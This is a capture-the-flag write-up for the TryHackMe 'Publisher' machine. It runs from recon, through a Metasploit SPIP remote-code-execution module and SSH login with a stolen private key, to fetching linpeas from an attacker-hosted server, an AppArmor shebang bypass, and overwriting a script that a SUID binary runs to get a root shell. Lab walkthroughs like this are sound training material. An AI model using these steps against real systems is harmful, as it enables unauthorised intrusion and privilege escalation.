# **Publisher | THM**

***

## **Difficulty == Easy**


![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/5cd8d676-dee0-49ef-916c-447fabe775f4)

***

First of all start jamming with this track as you solve the box xD 😆


<iframe style="border-radius:12px" src="https://open.spotify.com/embed/track/780BUxpCmW9vOVYZsqdLLE?utm_source=generator&theme=0" width="100%" height="352" frameBorder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>


Running our nmap scan we have


```
# Nmap 7.94SVN scan initiated Thu Jul  4 09:06:41 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 10.10.36.191
Warning: 10.10.36.191 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.36.191
Host is up (0.42s latency).
Not shown: 51611 closed tcp ports (conn-refused), 13922 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Publisher's Pulse: SPIP Insights & Tips
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul  4 09:10:12 2024 -- 1 IP address (1 host up) scanned in 210.99 seconds
```




Navigating to port 80/HTTP we have this website



![](https://i.imgur.com/0UeRidl.png)



Decided to run a directory bruteforce scan and got a `/spip` directory



```
ffuf -ic -u "http://10.10.36.191/FUZZ" -w /usr/share/wordlists/seclist/Discovery/Web-Content/directory-list-2.3-small.txt -fc 404,403,401 -fw 63 -e .txt,.php,.bak,.sql,.pdf,.png,.jpg,.jpeg,.html
```




![](https://i.imgur.com/AbNVHWT.png)



Navigating there looks like we have the true **spip** endpoint



![](https://i.imgur.com/TrgUwLr.png)



Searched for exploit and tried out the manual ones but to no avail



![](https://i.imgur.com/D7bG0TF.png)


Later found out that the reason why there is no response is due to the fact that there is meant to be two `oubli` parameter and we have only one, even by adding the other `oubli` parameter, still no response, find out more about this from [here](https://github.com/nuts7/CVE-2023-27372?tab=readme-ov-file)



![](https://i.imgur.com/TJHQbfr.png)



However for some reason metasploit works using this [module](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/webapp/spip_rce_form.rb) 



```
use exploit unix/webapp/spip_rce_form
set rhosts --
set lhost --
set lport --
set 
```


![](https://i.imgur.com/8dBGEVR.png)


Checking the home directory of the user `think`, i found the `id_rsa` key for this user, meaning we can now login via ssh as this user



![](https://i.imgur.com/TvakKAB.png)


Go ahead and copy the `id_rsa` key for this user and login directly 



```
nano id_rsa
chmod 600 id_rsa
ssh think@10.10.77.4 -i id_rsa
```




![](https://i.imgur.com/xL1BHAN.png)



For some reasons i can't upload files or even write to my own home folder and the temporary folder on this machine


![](https://i.imgur.com/4YiyNMM.png)



However i found out there is `/var/tmp` which in fact i can write to


![](https://i.imgur.com/yhpjVvb.png)



![](https://i.imgur.com/aUvwBlr.png)




Then i transferred `linpeas.sh` to the box ASAP



```bash
# Attacker
python3 -m http.server 80

# Victim
wget 10.2.15.115/linpeas.sh
```



![](https://i.imgur.com/DoOBjGf.png)




Something seems fishy after running linpeas, there is a world writable file called `run_container.sh` in the `/opt` directory




![](https://i.imgur.com/Yoj3nxZ.png)



....And there is also a suspicious SUID file called `run_container`


![](https://i.imgur.com/DFsjWvL.png)


Using the strings command on this file looks like the SUID binary calls the file in the `/opt` directory, interesting!!


![](https://i.imgur.com/DjgAXgS.png)


Navigating to the `/opt` directory we get a permission denied


![](https://i.imgur.com/28VEvdJ.png)


However there is an hint on getting root on the tryhackme website



![](https://i.imgur.com/mZL3WWT.png)



checking the `apparmor` profile we can see that there is a rule set for our currently default shell `/usr/sbin/ash`



```
cd /etc/apparmor.d
echo $SHELL
```



![](https://i.imgur.com/Kvccwjh.png)


> **AppArmor** (Application Armor) is a Linux security module that allows the system administrator to restrict programs' capabilities with per-program profiles.


According to the rules we have been denied access as following:

- denied read access to `/opt`
- denied write access to `/opt` due to the (`**`) at the end of the rule
- denied write access to `/tmp`, `/dev`, `/var`, `/home/**`
- Memory map, read, inherit and write permissions allowed on `/usr/bin/**`, `/usr/sbin/**`



![](https://i.imgur.com/iumwmKs.png)



No wonder we can't write or read the `/opt` directory directly, however we are able to at least cat out the file

```
cat /opt/run_container.sh
```


![](https://i.imgur.com/auG649x.png)



After several thought and trials i found this [YouTube video](https://www.youtube.com/watch?v=0FpXW7J-eX0) that helped me where we can actually create all our commands in a file and execute directly using the shebang bypass.


So what do we do ??


Since we have a restriction policy for our current shell in other to bypass this we need to start bash in a new process entirely, soo first of all let create a `.sh` file with all of our commands


```bash
cd /var/tmp
nano cmd.sh

# Paste Content Below

#!/bin/bash

echo "/bin/bash -p" > /opt/run_container.sh
```




![](https://i.imgur.com/1eVlIcb.png)


Now grant executable permissions and run with `./` not `bash` cos you are creating a bash process inside the `ash` shell which won't be executed. You can read more about this from [here](https://gist.github.com/sec-fortress/22a18ecba4fe03028892c1120bdbb82d)


```
chmod +x cmd.sh
./cmd.sh
```



![](https://i.imgur.com/SPQpzZx.png)




Then run the `run_container` SUID file to get root



![](https://i.imgur.com/lk9Uyqf.png)



Congratzzzz, Que se diviertan Amigos 🌠



![](https://i.imgur.com/hRlS5Hi.png)
